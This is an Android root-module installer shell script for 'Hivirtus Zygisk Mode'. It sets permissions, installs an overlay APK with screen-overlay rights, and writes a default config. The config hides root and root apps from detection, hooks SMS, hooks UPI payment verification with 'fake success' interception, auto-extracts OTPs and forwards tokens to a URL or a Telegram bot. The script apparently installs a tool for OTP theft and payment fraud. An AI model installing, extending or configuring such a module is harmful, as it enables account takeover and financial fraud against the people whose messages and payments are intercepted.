#!/system/bin/sh
# Hivirtus Zygisk Mode — Magisk / KernelSU / APatch / SukiSU installer

ui_print "*******************************"
ui_print "   Hivirtus Zygisk Mode v2.17.0  "
ui_print "   Zygisk Base Mode By @Hivirtus  "
ui_print "*******************************"

if [ -z "$MODPATH" ]; then
  ui_print "! ERROR: MODPATH not set"
  abort "Installation failed"
fi

ui_print "- Installing to $MODPATH"

set_perm_recursive "$MODPATH/zygisk" 0 0 0755 0644
[ -f "$MODPATH/post-fs-data.sh" ] && set_perm "$MODPATH/post-fs-data.sh" 0 0 0755
[ -f "$MODPATH/service.sh" ] && set_perm "$MODPATH/service.sh" 0 0 0755
[ -f "$MODPATH/start_overlay.sh" ] && set_perm "$MODPATH/start_overlay.sh" 0 0 0755
[ -f "$MODPATH/system/bin/hivirtus-overlay" ] && set_perm "$MODPATH/system/bin/hivirtus-overlay" 0 0 0755
[ -f "$MODPATH/customize.sh" ] && set_perm "$MODPATH/customize.sh" 0 0 0755
[ -f "$MODPATH/config.json" ] && set_perm "$MODPATH/config.json" 0 0 0644
[ -f "$MODPATH/module.prop" ] && set_perm "$MODPATH/module.prop" 0 0 0644

if [ ! -f "$MODPATH/zygisk/arm64-v8a.so" ] && [ ! -f "$MODPATH/zygisk/armeabi-v7a.so" ]; then
  ui_print "! WARNING: No Zygisk native libs in module"
  ui_print "! Rebuild zip with ./build.sh"
fi

if [ ! -f "$MODPATH/config.json" ]; then
  ui_print "- Creating default config"
  cat > "$MODPATH/config.json" << 'EOF'
{
  "hide_root": true,
  "hide_developer": true,
  "hide_magisk": true,
  "hide_kernelsu": true,
  "hide_apatch": true,
  "hide_sukisu": true,
  "hide_all_root_apps": true,
  "enable_sim1_mock": false,
  "enable_sim2_mock": false,
  "enable_phone_spoof": false,
  "mock_country_iso": "in",
  "hook_incoming_sms": true,
  "hook_outgoing_sms": true,
  "hook_upi_verification": true,
  "intercept_fake_success": true,
  "always_show_menu": false,
  "auto_extract_otp": true,
  "auto_forward_token": true,
  "forward_url": "",
  "telegram_chat_id": "",
  "telegram_bot_token": "",
  "log_file": "/data/local/tmp/hivirtus_zygisk_mode.log"
}
EOF
  set_perm "$MODPATH/config.json" 0 0 0644
fi

# Float bubble APK — APatch/Android 14 par reliable overlay
if [ -f "$MODPATH/overlay/virtus-float.apk" ]; then
  ui_print "- Installing float bubble APK"
  pm install -r -g -d "$MODPATH/overlay/virtus-float.apk" 2>/dev/null || \
    pm install -r "$MODPATH/overlay/virtus-float.apk" 2>/dev/null
  appops set com.hivirtus.zygiskmode.floatsvc SYSTEM_ALERT_WINDOW allow 2>/dev/null
  cmd appops set com.hivirtus.zygiskmode.floatsvc SYSTEM_ALERT_WINDOW allow 2>/dev/null
fi

if [ -d /data/adb/ksu ] || [ -f /dev/kernelsu ]; then
  ui_print "- KernelSU detected"
elif [ -f /data/adb/magisk.db ]; then
  ui_print "- Magisk detected"
elif [ -d /data/adb/apatch ]; then
  ui_print "- APatch detected"
  ui_print "! Zygote crash = SMS inject band"
  ui_print "! Bubble APK se chalega (Zygisk ki zaroorat nahi)"
fi

echo "1" > /data/local/tmp/hivirtus_module_installed.flag
chmod 644 /data/local/tmp/hivirtus_module_installed.flag 2>/dev/null

ui_print "- Left-side OTP bubble (reference style)"
ui_print "- Tap bubble = HTML menu"
ui_print "- Manual: su -c hivirtus-overlay"
ui_print "- Reboot to activate"
